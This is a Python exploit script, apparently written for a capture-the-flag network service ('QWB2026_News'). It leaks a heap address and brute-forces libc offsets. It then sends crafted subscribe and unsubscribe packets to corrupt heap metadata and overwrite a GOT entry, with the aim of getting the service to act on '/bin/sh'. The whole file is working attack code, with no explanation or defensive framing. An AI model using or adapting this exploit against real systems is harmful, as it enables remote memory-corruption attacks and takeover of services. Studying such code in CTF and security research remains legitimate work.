import socket, struct, time, sys
import probe3 as P
def probe(k, libc_off, align=0x80000000):
    try: s=socket.create_connection((P.HOST,P.PORT),10)
    except Exception: return 'CONN'
    s.sendall(P.build_leak()); time.sleep(2.0)
    buf=P.rd(s,1.2)
    i=buf.find(b'\x34\x2e\x00\x0cQWB2026_News'); leak=None
    if i>=0 and len(buf)>=i+2+0x2e:
        bd=buf[i+2:i+2+0x2e]; tl=struct.unpack('>H',bd[0:2])[0]
        pl=bd[2+tl+2:]
        if len(pl)>=8: leak=struct.unpack('>Q',pl[:8])[0]
    if not leak: s.close(); return 'LEAK'
    BASE=leak-P.BIN2HEAP
    G=(BASE & ~(align-1)) + k*align
    libc=G+libc_off
    val=libc+P.PUTS_OFF
    pl2=bytearray(b'A'*272); pl2[24:32]=struct.pack('>Q',0x21); pl2[32:40]=struct.pack('>Q',(BASE+P.GOT_OFF)-16)
    for p in [P.subb('/bin/sh'),P.subb('d1xx'),P.subb('d2xx'),P.subb('Xx'),P.subb('Yy'),P.subb('Z'*400),
              P.unsubb('Yy'),P.unsubb('Xx'),
              P.subb(raw=0xFFFF,pl=bytes(pl2)),P.subb('AAAA'),P.subb(struct.pack('>Q',val))]:
        s.sendall(p); time.sleep(0.12)
    s.sendall(P.unsubb('/bin/sh')); time.sleep(2.5)
    out=P.rd(s,2.0); s.close()
    if b'/bin/sh' in out: return 'HIT k=%d off=%#x libc=%#x'%(k,libc_off,libc)
    n=out.count(b'\x90\x03\x00\x01\x01')
    return 'miss' if n>=9 else 'flaky'
for k in [int(x) for x in sys.argv[3].split(',')]:
    for off in [int(x,16) for x in sys.argv[4].split(',')]:
        print('k=%d off=%#x ->'%(k,off), probe(k,off), flush=True)
